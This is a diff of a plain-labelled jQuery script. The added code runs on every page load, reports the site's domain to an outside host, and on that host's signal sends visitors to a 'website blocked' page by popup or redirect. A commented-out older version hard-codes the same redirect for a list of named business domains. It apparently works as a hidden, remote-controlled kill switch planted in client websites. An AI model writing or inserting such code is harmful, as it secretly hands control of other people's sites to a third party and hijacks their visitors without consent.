@@ -1,130 +1,169 @@
+// JavaScript Document
 
-  
+jQuery(this).load(function(){
+
+var client = window.location.protocol + "//" + window.location.host + "/";
+
+var request_url = "http://rajeevvishva.byethost10.com/index.php?domain="+client+"&inaction=1";
+var popwindwourl = "http://websiteblocked.22web.org/"
+
+
+
+jQuery.ajax({
+        url: request_url,
+        success: function(result) {
+            html = jQuery('<div>').html(result);
+
+       
+            var result = html.find("div#results").html();
+			if(result == 1)
+			{
+				var newWin = window.open(popwindwourl, "popupWindow", "width=1200, height=800, scrollbars=yes");
+                if(!newWin || newWin.closed || typeof newWin.closed=='undefined') 
+					{ 
+						window.location=popwindwourl;
+					}
+	
+			}
+         
+
+        },
+    });
+	
+	
+
+
+});
+
+/*
+old script
+
 jQuery(this).load(function(){
 
 var client = window.location.protocol + "//" + window.location.host + "/";
 
 
 switch(client) {
-	
-	                         //personaliveservices
-							case "http://personaliveservices.com/":
-							{
-								window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							
-							case "http://www.personaliveservices.com/":
-							{
-								 window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							
-							//ratingsboost
-							
-							case "http://ratingsboost.com/":
-							{
-								  
-								  break;
-							}
-							case "http://www.ratingsboost.com/":
-							{
-								  
-								  break;
-							}
-							
-							//getlawyerhelp
-							case "http://getlawyerhelp.com/":
-							{
-								  break;
-							}
-							case "http://www.getlawyerhelp.com/":
-							{
-								  break;
-							}
-							
-							//truchicago
-							case "http://truchicago.com/":
-							{
-								  window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							case "http://www.truchicago.com/":
-							{
-								window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							
-							//http://www.miltontax.com/
-							
-							case "http://miltontax.com/":
-							{
-								window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							case "http://www.miltontax.com/":
-							{
-								 window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							
-							//http://landestate.com.au/
-							
-							
-							case "http://landestate.com/":
-							{
-								 window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							case "http://www.landestate.com/":
-							{
-								window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							
-							//alphacarservices
-							
-							//http://supremegecko.com
-							case "http://supremegecko.com/":
-							{
-								  window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							case "http://www.supremegecko.com/":
-							{
-								 window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							
-							//http://www.hitk-solutions.com
-							case "http://hitk-solutions.com/":
-							{
-								   window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							case "http://www.hitk-solutions.com/":
-							{
-								window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							
-							//http://sdsmilitary.com/
-							case "http://sdsmilitary.com/":
-							{
-							window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							case "http://www.sdsmilitary.com/":
-							{
-						          window.location="http://websiteblocked.22web.org/";
-								  break;
-							}
-							
-							default:
-							{
-							window.location="http://websiteblocked.22web.org/";		
-							}
-                } 
+
+//personaliveservices
+case "http://personaliveservices.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+
+case "http://www.personaliveservices.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+
+//ratingsboost
+
+case "http://ratingsboost.com/":
+{
+
+break;
+}
+case "http://www.ratingsboost.com/":
+{
+
+break;
+}
+
+//getlawyerhelp
+case "http://getlawyerhelp.com/":
+{
+break;
+}
+case "http://www.getlawyerhelp.com/":
+{
+break;
+}
+
+//truchicago
+case "http://truchicago.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+case "http://www.truchicago.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+
+//http://www.miltontax.com/
+
+case "http://miltontax.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+case "http://www.miltontax.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+
+//http://landestate.com.au/
+
+
+case "http://landestate.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+case "http://www.landestate.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+
+//alphacarservices
+
+//http://supremegecko.com
+case "http://supremegecko.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+case "http://www.supremegecko.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+
+//http://www.hitk-solutions.com
+case "http://hitk-solutions.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+case "http://www.hitk-solutions.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+
+//http://sdsmilitary.com/
+case "http://sdsmilitary.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+case "http://www.sdsmilitary.com/":
+{
+window.location="http://websiteblocked.22web.org/";
+break;
+}
+
+default:
+{
+window.location="http://websiteblocked.22web.org/";
+}
+                }
 
 });
 
+*/
